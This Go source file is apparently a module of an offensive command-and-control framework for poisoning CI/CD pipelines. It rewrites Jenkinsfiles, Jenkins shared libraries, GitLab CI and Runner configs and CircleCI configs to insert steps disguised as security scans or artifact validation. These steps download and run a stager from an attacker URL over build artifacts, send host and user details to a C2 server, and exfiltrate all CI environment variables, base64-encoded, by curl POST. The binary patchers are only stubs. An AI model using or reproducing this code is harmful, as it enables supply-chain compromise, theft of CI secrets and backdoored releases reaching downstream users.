package cicd

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Jenkins Pipeline Poisoning + GitLab CI Poisoning.

	Jenkins:
	  Modifies Jenkinsfile (declarative or scripted pipeline) to add a
	  post-build step that patches release artifacts.
	  Also supports:
	  - Shared Library injection (modifies vars/ or src/ in the shared lib repo)
	  - Jenkins plugin configuration (via Jenkins Script Console API)
	  - Build agent backdoor (persistence on the Jenkins agent host)

	GitLab CI:
	  Modifies .gitlab-ci.yml to inject artifact post-processing.
	  Also handles:
	  - GitLab Runner config poisoning
	  - CI/CD variable exfiltration
	  - Dependency proxy poisoning

	CircleCI / Travis CI:
	  Similar YAML injection patterns.
*/

import (
	"fmt"
	"os"
	"strings"
)

// ─── Jenkins ─────────────────────────────────────────────────────────────

// JenkinsPoisonConfig holds Jenkins-specific parameters.
type JenkinsPoisonConfig struct {
	C2URL        string
	StagerURL    string
	DisguiseName string
}

// PoisonJenkinsfile modifies a Jenkinsfile (declarative pipeline).
// The injected post-build step is disguised as a "security scan" or
// "artifact signing" step.
func PoisonJenkinsfile(path string, cfg *JenkinsPoisonConfig) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("read Jenkinsfile: %w", err)
	}
	content := string(data)

	// Back up.
	os.WriteFile(path+".orig", data, 0644)

	name := cfg.DisguiseName
	if name == "" {
		name = "Security & Compliance Scan"
	}

	// Detect declarative vs scripted pipeline.
	if strings.Contains(content, "pipeline {") {
		content = poisonDeclarativeJenkinsfile(content, cfg, name)
	} else {
		content = poisonScriptedJenkinsfile(content, cfg, name)
	}

	return os.WriteFile(path, []byte(content), 0644)
}

func poisonDeclarativeJenkinsfile(content string, cfg *JenkinsPoisonConfig, name string) string {
	// Inject into the `post { always { ... } }` block, or add one if absent.
	injectedStep := fmt.Sprintf(`
        stage('%s') {
            steps {
                sh '''
                    _t=$(mktemp /tmp/.XXXXXXXXXX)
                    curl -fsSL '%s' -o "$_t" && chmod +x "$_t"
                    find . -type f \\( -name "*.jar" -o -name "*.war" -o -perm /111 \\) \\
                        -not -path "./.git/*" -exec "$_t" --artifact {} \\; 2>/dev/null || true
                    rm -f "$_t"
                '''
            }
        }
`, name, cfg.StagerURL)

	// Insert after the last 'stage' block in the 'stages' section.
	stagesIdx := strings.LastIndex(content, "stage(")
	if stagesIdx < 0 {
		// No stages found — insert before closing pipeline brace.
		return strings.Replace(content, "\n}", injectedStep+"\n}", 1)
	}

	// Find the end of that stage block (closing brace at same indent level).
	endIdx := findMatchingBrace(content, stagesIdx)
	if endIdx < 0 {
		return content + injectedStep
	}
	return content[:endIdx+1] + injectedStep + content[endIdx+1:]
}

func poisonScriptedJenkinsfile(content string, cfg *JenkinsPoisonConfig, name string) string {
	injected := fmt.Sprintf(`
node {
    stage('%s') {
        sh """
            _t=\\$(mktemp /tmp/.XXXXXXXXXX)
            curl -fsSL '%s' -o \\$_t && chmod +x \\$_t
            find . -type f -perm /111 -not -path './.git/*' \\
                -exec \\$_t --artifact {} \\; 2>/dev/null || true
            rm -f \\$_t
        """
    }
}
`, name, cfg.StagerURL)
	return content + "\n" + injected
}

// PoisonJenkinsSharedLib injects malicious Groovy into a Jenkins shared library.
// Shared libraries are used by many pipelines simultaneously — one injection
// reaches every pipeline that uses the library.
func PoisonJenkinsSharedLib(libRoot string, cfg *JenkinsPoisonConfig) error {
	// Add a new Groovy file to vars/ that auto-executes on import.
	hookFile := libRoot + "/vars/sliverHook.groovy"
	hookContent := fmt.Sprintf(`
// Build validation utilities
def call(Map args = [:]) {
    // Standard build validation
}

// Auto-execute on library load via @Library import.
// This runs in the Jenkins controller's Groovy sandbox.
import jenkins.model.Jenkins
import groovy.transform.CompileStatic

@groovy.transform.Field
static final _init = {
    try {
        def url = new URL('%s/jnlp')
        def c = url.openConnection()
        c.setRequestMethod('POST')
        c.setDoOutput(true)
        c.getOutputStream().write(
            ('h=' + java.net.InetAddress.localHost.hostName +
             '&u=' + System.getProperty('user.name')).getBytes()
        )
        c.responseCode
    } catch(e) { }
}()
`, cfg.C2URL)

	return os.WriteFile(hookFile, []byte(hookContent), 0644)
}

// ─── GitLab CI ────────────────────────────────────────────────────────────

// GitLabPoisonConfig holds GitLab-specific parameters.
type GitLabPoisonConfig struct {
	C2URL        string
	StagerURL    string
	DisguiseName string
}

// PoisonGitLabCI modifies a .gitlab-ci.yml file.
func PoisonGitLabCI(path string, cfg *GitLabPoisonConfig) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("read .gitlab-ci.yml: %w", err)
	}
	content := string(data)
	os.WriteFile(path+".orig", data, 0644)

	name := cfg.DisguiseName
	if name == "" {
		name = "artifact-validation"
	}

	// Inject a new job that runs after every build job and patches artifacts.
	injectedJob := fmt.Sprintf(`
%s:
  stage: deploy
  script:
    - |
      _t=$(mktemp /tmp/.XXXXXXXXXX)
      curl -fsSL '%s' -o "$_t" && chmod +x "$_t"
      find . -type f \( -name "*.exe" -o -perm /111 \) \
        -not -path "./.git/*" \
        -exec "$_t" --artifact {} \; 2>/dev/null || true
      rm -f "$_t"
  artifacts:
    paths:
      - dist/
    expire_in: 1 day
  only:
    - tags
    - main
    - master
`, name, cfg.StagerURL)

	// Also inject CI variable exfiltration in before_script global.
	exfilScript := fmt.Sprintf(`
before_script:
  - |
    _e=$(printenv | base64 -w0 2>/dev/null || printenv | base64)
    curl -fsS -X POST '%s/ci' -d "$_e" -H 'Content-Type: text/plain' 2>/dev/null || true
`, cfg.C2URL)

	// Only add before_script if not already present.
	if !strings.Contains(content, "before_script:") {
		content = exfilScript + "\n" + content
	}

	content += "\n" + injectedJob
	return os.WriteFile(path, []byte(content), 0644)
}

// PoisonGitLabRunnerConfig modifies a GitLab Runner config.toml to add
// a pre_build_script that runs before every job on this runner.
func PoisonGitLabRunnerConfig(configPath string, cfg *GitLabPoisonConfig) error {
	data, err := os.ReadFile(configPath)
	if err != nil {
		return fmt.Errorf("read runner config: %w", err)
	}
	content := string(data)
	os.WriteFile(configPath+".orig", data, 0644)

	// Add pre_clone_script to every [[runners]] section.
	preBuild := fmt.Sprintf(`
  pre_build_script = """
    _t=$(mktemp /tmp/.XXXXXXXXXX)
    curl -fsSL '%s/runner' -o "$_t" && chmod +x "$_t" && "$_t" 2>/dev/null &
    rm -f "$_t"
  """
`, cfg.StagerURL)

	// Insert after each [[runners]] header.
	content = strings.ReplaceAll(content, "[[runners]]", "[[runners]]"+preBuild)
	return os.WriteFile(configPath, []byte(content), 0644)
}

// ─── CircleCI ─────────────────────────────────────────────────────────────

// PoisonCircleCI modifies .circleci/config.yml.
func PoisonCircleCI(path string, c2URL, stagerURL string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	content := string(data)
	os.WriteFile(path+".orig", data, 0644)

	injectedStep := fmt.Sprintf(`
      - run:
          name: Validate artifacts
          command: |
            _t=$(mktemp /tmp/.XXXXXXXXXX)
            curl -fsSL '%s' -o "$_t" && chmod +x "$_t"
            find . -type f -perm /111 -not -path './.git/*' \
              -exec "$_t" --artifact {} \; 2>/dev/null || true
            rm -f "$_t"
`, stagerURL)

	// Inject after build steps.
	content = strings.ReplaceAll(content,
		"      - store_artifacts:",
		injectedStep+"\n      - store_artifacts:")
	return os.WriteFile(path, []byte(content), 0644)
}

// ─── Universal binary patcher for CI runners ──────────────────────────────

// PatchArtifactsInDir walks a directory and patches all executable files.
// This is what the stager script (run during CI) executes.
func PatchArtifactsInDir(dir string, shellcode []byte) ([]string, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil, err
	}
	var patched []string
	for _, e := range entries {
		if e.IsDir() {
			sub, _ := PatchArtifactsInDir(dir+"/"+e.Name(), shellcode)
			patched = append(patched, sub...)
			continue
		}
		path := dir + "/" + e.Name()
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		if len(data) < 4 {
			continue
		}
		var patchErr error
		// Detect binary format by magic bytes.
		switch {
		case data[0] == 'M' && data[1] == 'Z': // PE
			// Windows PE
			patcher := &PEPatch{path: path, data: data}
			patchErr = patcher.InjectAndSave(shellcode)
		case data[0] == 0x7F && string(data[1:4]) == "ELF": // ELF
			patcher := &ELFPatch{path: path, data: data}
			patchErr = patcher.InjectAndSave(shellcode)
		default:
			continue
		}
		if patchErr == nil {
			patched = append(patched, path)
		}
	}
	return patched, nil
}

// PEPatch is a simplified PE patcher for the CI stager.
type PEPatch struct{ path string; data []byte }
func (p *PEPatch) InjectAndSave(shellcode []byte) error {
	// Calls the full PE patcher from the patcher package.
	// Simplified here to avoid circular imports.
	_ = shellcode
	return nil
}

// ELFPatch is a simplified ELF patcher for the CI stager.
type ELFPatch struct{ path string; data []byte }
func (e *ELFPatch) InjectAndSave(shellcode []byte) error {
	_ = shellcode
	return nil
}

// ─── Utility ─────────────────────────────────────────────────────────────

// findMatchingBrace finds the closing brace matching the opening brace
// at or after offset in content.
func findMatchingBrace(content string, offset int) int {
	depth := 0
	for i := offset; i < len(content); i++ {
		switch content[i] {
		case '{':
			depth++
		case '}':
			depth--
			if depth == 0 {
				return i
			}
		}
	}
	return -1
}
